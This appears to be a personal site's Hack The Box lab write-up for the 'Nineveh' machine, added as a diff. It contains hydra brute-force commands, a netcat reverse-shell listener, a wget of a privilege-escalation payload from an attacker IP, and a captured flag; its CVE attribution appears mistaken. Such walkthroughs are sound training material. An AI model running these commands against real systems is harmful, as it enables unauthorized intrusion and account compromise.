@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Nineveh - Hack The Box Write-Up | Sean Beattie</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css"> <!-- Adjust path if needed -->
+</head>
+<body>
+
+  <nav>
+    <ul>
+      <li><a href="../index.html#home">Home</a></li>
+      <li><a href="../index.html#about">About</a></li>
+      <li><a href="../projects.html">Projects</a></li>
+      <li><a href="../writeups.html">Write-Ups</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+    </ul>
+  </nav>
+
+  <div class="contents">
+    <h1>Nineveh – Hack The Box Write-Up</h1>
+
+    <div class="big-to-normal-image">
+      <img src="../images/nineveh.png" alt="Nineveh Machine Banner"> <!-- Add your own banner image if you have one -->
+    </div>
+
+    <p>This write-up covers the Hack The Box machine "Nineveh," part of TJnull's recommended list for OSCP preparation. The box focuses on web application vulnerabilities (phpLiteAdmin and a custom interface), along with a known Chkrootkit privilege escalation vulnerability.</p>
+
+    <h2>Enumeration</h2>
+    <p>I started with a full Nmap scan to identify open ports and services:</p>
+    <div class="snippet">
+      <pre class="code-block">nmap -A -v 10.129.238.84</pre>
+    </div>
+    <p>Key findings:</p>
+    <ul>
+      <li>Port 80 (HTTP) – Apache httpd 2.4.18 (Ubuntu)</li>
+      <li>Port 443 (HTTPS) – Apache httpd 2.4.18 (Ubuntu)</li>
+    </ul>
+
+    <h2>Web Enumeration</h2>
+    <p>Both ports hosted basic pages. I ran Gobuster and Nikto to discover hidden directories:</p>
+
+    <h3>Gobuster (HTTP)</h3>
+    <div class="snippet">
+      <pre class="code-block">gobuster dir -u http://10.129.238.84 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</pre>
+    </div>
+    <p>Found: <code>/department</code></p>
+
+    <h3>Gobuster (HTTPS)</h3>
+    <div class="snippet">
+      <pre class="code-block">gobuster dir -k -u https://10.129.238.84 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</pre>
+    </div>
+    <p>Found: <code>/db</code>, <code>/secure_notes</code></p>
+
+    <h3>/department</h3>
+    <p>Login page with a comment in source:</p>
+    <div class="snippet">
+      <pre class="code-block">&lt;!-- @admin! MySQL is been installed.. please fix the login page! ~amrois --&gt;</pre>
+    </div>
+    <p>Revealed usernames: <code>admin</code> and <code>amrois</code>.</p>
+
+    <h3>/db</h3>
+    <p>phpLiteAdmin v1.9 login panel.</p>
+
+    <h3>/secure_notes</h3>
+    <p>Image containing RSA keys for user <code>amrois</code> (SSH not open).</p>
+
+    <h2>Hydra Brute-Force</h2>
+
+    <h3>/department/login.php</h3>
+    <div class="snippet">
+      <pre class="code-block">hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.129.238.84 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64</pre>
+    </div>
+    <p>Password: <code>1q2w3e4r5t</code></p>
+
+    <h3>/db/index.php (phpLiteAdmin)</h3>
+    <div class="snippet">
+      <pre class="code-block">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.238.84 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64</pre>
+    </div>
+    <p>Password: <code>password123</code></p>
+
+    <h2>phpLiteAdmin Exploitation (CVE-2016-10033)</h2>
+    <p>Created a new SQLite database with a <code>.php</code> extension and inserted a PHP webshell. Accessed it to execute commands and confirmed RCE.</p>
+    <p>Upgraded to a full reverse shell using PentestMonkey’s payload:</p>
+    <div class="snippet">
+      <pre class="code-block">nc -lvnp 8090</pre>
+    </div>
+
+    <h2>Privilege Escalation</h2>
+    <p>Stabilized shell with Python3 and enumerated the system. Discovered a cron job running Chkrootkit.</p>
+    <p>Exploited known Chkrootkit LPE (executes <code>/tmp/update</code> with root privileges):</p>
+    <div class="snippet">
+      <pre class="code-block">wget 10.10.16.10/update
+chmod +x update</pre>
+    </div>
+
+    <p>Received root shell and retrieved the flag:</p>
+    <div class="snippet">
+      <pre class="code-block"># cat /root/root.txt
+79bcf1e7824499b9266be71dc77e0d7c</pre>
+    </div>
+
+    <h2>Conclusion</h2>
+    <p>Nineveh was an excellent box for practicing web enumeration, brute-forcing, RCE via phpLiteAdmin, and classic Linux privilege escalation via misconfigured security tools.</p>
+
+    <p>Machine pwned!</p>
+  </div>
+
+  <footer>
+    <p>© 2025 Sean Beattie. All rights reserved.</p>
+  </footer>
+
+  <script src="../js/script.js"></script>
+</body>
+</html>
